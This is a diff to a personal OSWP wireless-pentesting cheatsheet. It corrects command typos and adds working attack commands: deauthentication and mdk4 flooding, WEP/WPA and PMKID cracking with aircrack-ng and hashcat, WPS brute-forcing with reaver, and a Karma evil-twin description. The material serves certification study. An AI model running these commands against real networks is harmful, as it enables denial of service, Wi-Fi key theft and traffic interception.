@@ -8,6 +8,7 @@ description: "OSWP personal cheatsheet"
 
 # Table of contents
 
+- [Table of contents](#table-of-contents)
 - [WIFU](#wifu)
   - [Listing wireless access points that are within range](#listing-wireless-access-points-that-are-within-range)
   - [Monitor mode](#monitor-mode)
@@ -50,7 +51,31 @@ description: "OSWP personal cheatsheet"
     - [Cracking WPA with coWPAtty](#cracking-wpa-with-cowpatty)
     - [Cracking WPA with Pyrit](#cracking-wpa-with-pyrit)
     - [Airgraph-ng](#airgraph-ng)
-    - [Miscellaneous](#miscellaneous)
+  - [Miscellaneous](#miscellaneous)
+    - [WPA/WPA2 no clients showing](#wpawpa2-no-clients-showing)
+    - [Find hidden SSID](#find-hidden-ssid)
+    - [Airgeddon](#airgeddon)
+  - [Not in the OSWP PDF (Going further)](#not-in-the-oswp-pdf-going-further)
+    - [MKD4](#mkd4)
+      - [Beacon flood (Non very effective)](#beacon-flood-non-very-effective)
+      - [Authentication Denial-Of-Service (Non very effective)](#authentication-denial-of-service-non-very-effective)
+      - [Deauthentication Flooding](#deauthentication-flooding)
+    - [WPA/WPA2](#wpawpa2)
+      - [Crack with hashcat](#crack-with-hashcat)
+      - [Clientless - PMKID attack](#clientless---pmkid-attack)
+        - [Any SSID](#any-ssid)
+        - [Specific SSID](#specific-ssid)
+    - [Attacking WPA2-Enterprise](#attacking-wpa2-enterprise)
+    - [WPS Pin attacks](#wps-pin-attacks)
+      - [Offline](#offline)
+      - [Online](#online)
+    - [Other WEP Attacks](#other-wep-attacks)
+      - [Hirte attack](#hirte-attack)
+      - [Cafe Latte attack](#cafe-latte-attack)
+    - [Rogue access point](#rogue-access-point)
+      - [Karma attack](#karma-attack)
+      - [Fake AP](#fake-ap)
+      - [MITM](#mitm)
 
 # WIFU
 
@@ -224,7 +249,7 @@ aircrack-ng -f <FUDGE> <CAPTURE_NAME>
 ##### Dictionnary attack
 
 ```
-aircrack-ng -w <PASSWORDS_DICTIONNARY> <CAPTURE_NAME> 
+aircrack-ng -w <PASSWORDS_WORDLIST> <CAPTURE_NAME> 
 ```
 
 ### Cracking WEP via a Client
@@ -292,7 +317,7 @@ aireplay-ng -1 0 -e <ESSID> -a <BSSID> -h <YOUR_MAC> <INTERFACE>
 aireplay-ng -5 -b <BSSID> -h <YOUR_MAC> <INTERFACE>
 
 # Forging ARP packet with the xor packet from fragmentation attack
-packetforge-ng -0 –a <BSSID> -h <YOUR_MAC> -k 255.255.255.255 -l 255.255.255.255 -y <FRAGMENT_PACKET>.xor -w <ARP_PACKET_NAME>
+packetforge-ng -0 -a <BSSID> -h <YOUR_MAC> -k 255.255.255.255 -l 255.255.255.255 -y <FRAGMENT_PACKET>.xor -w <ARP_PACKET_NAME>
 
 # Interactive packet replay attack with the forge ARP packet
 aireplay-ng -2 -r <ARP_PACKET_NAME> <INTERFACE>
@@ -320,7 +345,7 @@ aireplay-ng -1 0 -e <ESSID> -a <BSSID> -h <YOUR_MAC> <INTERFACE>
 aireplay-ng -4 -b <BSSID> -h <YOUR_MAC> <INTERFACE>
 
 # Forging ARP packet with the xor packet from chop chop attack 
-packetforge-ng -0 –a <BSSID> -h <YOUR_MAC> -k 255.255.255.255 -l 255.255.255.255 -y <CHOP_CHOP_PACKET>.xor -w <ARP_PACKET_NAME>
+packetforge-ng -0 -a <BSSID> -h <YOUR_MAC> -k 255.255.255.255 -l 255.255.255.255 -y <CHOP_CHOP_PACKET>.xor -w <ARP_PACKET_NAME>
 
 # Interactive packet replay attack with the forge ARP packet
 aireplay-ng -2 -r <ARP_PACKET_NAME> <INTERFACE>
@@ -415,7 +440,7 @@ airolib-ng <DB_NAME> --import passwd <PASSWORDS_WORDLIST>
 airolib-ng <DB_NAME> --batch
 
 # Crack with precomputed pmk
-aircrack-ng –r <DB_NAME> <Handshaked_PCAP>
+aircrack-ng -r <DB_NAME> <Handshaked_PCAP>
 ```
 
 ### Cracking WPA with John The Ripper and Aircrack-ng
@@ -431,7 +456,7 @@ airodump-ng -w <CAPTURE_NAME> -c <CHANNEL> --bssid <BSSID> <INTERFACE>
 aireplay-ng -0 1 -a <BSSID> -c <CLIENT_MAC> <INTERFACE>
 
 # Crack with john
-john –wordlist=<PASSWORDS_WORDLIST> --rules –stdout | aircrack-ng -0 –e <ESSID> -w - <CAPTURE_NAME>
+john -wordlist=<PASSWORDS_WORDLIST> --rules -stdout | aircrack-ng -0 -e <ESSID> -w - <CAPTURE_NAME>
 
 or
 
@@ -442,7 +467,7 @@ aircrack-ng <CAPTURE_NAME> -J john_out
 hccap2john john_out.hccap > out
 
 # Crack with john
-john –wordlist=<PASSWORDS_WORDLIST> --rules out
+john -wordlist=<PASSWORDS_WORDLIST> --rules out
 ```
 
 ### Cracking WPA with coWPAtty
@@ -464,13 +489,13 @@ cowpatty -r <CAPTURE_NAME> -c
 ## ELSE crack it with aircrack-ng
 
 # Crack (slow better use aircrack-ng)
-cowpatty –r <CAPTURE_NAME> -f <PASSWORDS_WORDLIST> -2 –s <SSID>
+cowpatty -r <CAPTURE_NAME> -f <PASSWORDS_WORDLIST> -s <SSID>
 
 # Generate hashes for the specific SSID (Slow to generate)
-genpmk –s <SSID> –f <PASSWORDS_WORDLIST> -d <HASHES_FILENAME>
+genpmk -s <SSID> -f <PASSWORDS_WORDLIST> -d <HASHES_FILENAME>
 
 # Crack (Very fast)
-cowpatty –r <PASSWORDS_WORDLIST> -d <HASHES_FILENAME> -2 –s <SSID>
+cowpatty -r <PASSWORDS_WORDLIST> -d <HASHES_FILENAME> -s <SSID>
 ```
 
 ### Cracking WPA with Pyrit
@@ -486,21 +511,21 @@ airodump-ng -w <CAPTURE_NAME> -c <CHANNEL> --bssid <BSSID> <INTERFACE>
 aireplay-ng -0 1 -a <BSSID> -c <CLIENT_MAC> <INTERFACE>
 
 # Crack (slow better use aircrack-ng)
-pyrit –r <CAPTURE_NAME> -b <BSSID> -i <PASSWORDS_WORDLIST> attack_passthrough
+pyrit -r <CAPTURE_NAME> -b <BSSID> -i <PASSWORDS_WORDLIST> attack_passthrough
 
 or
 
 # Import passwords list
-pyrit –i <PASSWORDS_WORDLIST> import_passwords
+pyrit -i <PASSWORDS_WORDLIST> import_passwords
 
 # Import ESSID in database
-pyrit –e <ESSID> create_essid
+pyrit -e <ESSID> create_essid
 
-# Generate hashes for the specific SSID (Slow to generate)
+# Generate hashes for the specific SSID (Slow to generate, but faster than coWPAtty)
 pyrit batch
 
 # Crack (Very fast)
-pyrit –r <PCAP_of_FileName> attack_db
+pyrit -r <CAPTURE_NAME> attack_db
 ```
 
 ### Airgraph-ng
@@ -511,11 +536,174 @@ Airgraph-ng is a Python script that creates graphs of wireless networks using th
 airgraph-ng -i <FILENAME>.csv -g CAPR -o out.png
 ```
 
-### Miscellaneous
+## Miscellaneous
 
-In WPA/WPA2 if there is no clients connected, try to broadcast deauthenticate.
+### WPA/WPA2 no clients showing
+
+In WPA/WPA2 if there is no clients connected, try to broadcast deauthenticate. Do it a few times and if there is clients connected they should pop on your airodump-ng capture.
 
 ```
 # Deauthentication broadcast attack
 aireplay-ng -0 1 -a <BSSID> <INTERFACE>
 ```
+
+### Find hidden SSID
+
+```
+# Start monitor mode
+airmon-ng start <INTERFACE>
+
+# Packet capture
+airodump-ng -c <CHANNEL> --bssid <BSSID> <INTERFACE>
+
+# Deauthentication attack
+aireplay-ng -0 20 -a <BSSID> -c <CLIENT_MAC> <INTERFACE>
+
+or
+
+# Deauthentication broadcast attack
+aireplay-ng -0 20 -a <BSSID> <INTERFACE>
+```
+
+### Airgeddon
+
+Airgeddon can do pretty much any of the attacks view in this post.
+
+```
+https://github.com/v1s1t0r1sh3r3/airgeddon
+```
+
+## Not in the OSWP PDF (Going further)
+
+### MKD4
+
+#### Beacon flood (Non very effective)
+
+Sends beacon frames to show fake APs at clients. This can sometimes crash network scanners and even drivers. 
+
+```
+mdk4 <INTERFACE> b -n <AP_NAME> b -w nta -m
+```
+
+#### Authentication Denial-Of-Service (Non very effective)
+
+Too many authentication requests at one time may cause the wireless access point to freeze up and perhaps stop working entirely.
+
+```
+mdk4 <INTERFACE> a -a <BSSID> -m
+```
+
+#### Deauthentication Flooding
+
+This will sent deauth packets to any and all clients connected to the AP specified in the file.
+
+```
+mdk4 <INTERFACE> d -c <CHANNEL> -E <ESSID> -B <BSSID>
+```
+
+### WPA/WPA2
+
+#### Crack with hashcat
+
+First, use airodump-ng to get the 4-way Handshake. Then convert the capture, so that it can be used with hashcat :
+
+```
+# Convert cap to hccapx
+cap2hccapx <CAPTURE_NAME>.cap <CAPTURE_NAME>.hccapx
+
+# Crack with hashcat
+hashcat -m 2500 -a 0 <CAPTURE_NAME>.hccapx <PASSWORDS_WORDLIST>
+```
+
+#### Clientless - PMKID attack
+
+##### Any SSID
+
+```
+# Capture PMKID
+hcxdumptool -i wlan0 -o galleria.pcapng --enable_status=1
+
+# Convert the dump for hashcat
+hcxpcaptool -E essidlist -I identitylist -U usernamelist -z galleriaHC.16800 galleria.pcapng
+
+# Crack with hashcat
+hashcat -m 16800 -a 0 galleriaHC.16800 <PASSWORDS_WORDLIST>
+```
+
+##### Specific SSID
+
+```
+# Get bssid of your target
+airodump-ng <INTERFACE>
+
+# Put bssid inside a file
+echo "<BSSID>" | sed 's/://g' > bssid
+
+# Capture specific BSSID
+hcxdumptool -i <INTERFACE> -o galleria.pcapng --enable_status=15 --filterlist_ap=bssid --filtermode=2
+
+# Convert the dump for hashcat
+hcxpcaptool -E essidlist -I identitylist -U usernamelist -z galleriaHC.16800 galleria.pcapng
+
+# Crack with hashcat
+hashcat -m 16800 -a 0 galleriaHC.16800 <PASSWORDS_WORDLIST>
+```
+
+### Attacking WPA2-Enterprise
+
+
+
+### WPS Pin attacks
+
+```
+# Identifying access points with WPS enabled
+wash -i <INTERFACE> -s
+```
+
+We're looking for access point, in which the column **Lck** is equal to **No**.
+
+```
+# Get your MAC address
+macchanger --show <INTERFACE>
+
+# Fake authentication attack
+aireplay-ng -1 0 -e <ESSID> -a <BSSID> -h <YOUR_MAC> <INTERFACE>
+```
+
+#### Offline
+
+```
+# Offline brute force (pixie dust)
+reaver -i wlan0 -b 00:06:91:DE:B1:30 -SNLAvv  -c 1 -K
+```
+
+#### Online
+
+```
+# Online brute force  
+reaver -i <INTERFACE> -b <BSSID> -SNLAsvv -d 1 -r 5:3 -c <CHANNEL_NUMBER>
+```
+
+### Other WEP Attacks
+
+#### Hirte attack
+
+
+
+#### Cafe Latte attack
+
+
+
+### Rogue access point
+
+#### Karma attack
+
+Vulnerable client devices broadcast a "preferred network list" (PNL), which contains the SSIDs of access points to which they have previously connected and are willing to automatically reconnect without user  intervention. These broadcasts are not encrypted and hence may be received by any WiFi access point in range. The KARMA attack consists in an access point receiving this list and then giving itself an SSID from the PNL, thus becoming an evil twin of an access point already trusted by the client.
+
+Once that has been done, if the client receives the malicious  access point's signal more strongly than that of the genuine access  point (for example, if the genuine access point is nowhere nearby), and  if the client does not attempt to authenticate the access point, then  the attack should succeed. If the attack succeeds, then the malicious  access point becomes a man in the middle (MITM), which positions it to deploy other attacks against the victim device.
+
+#### Fake AP
+
+
+
+#### MITM
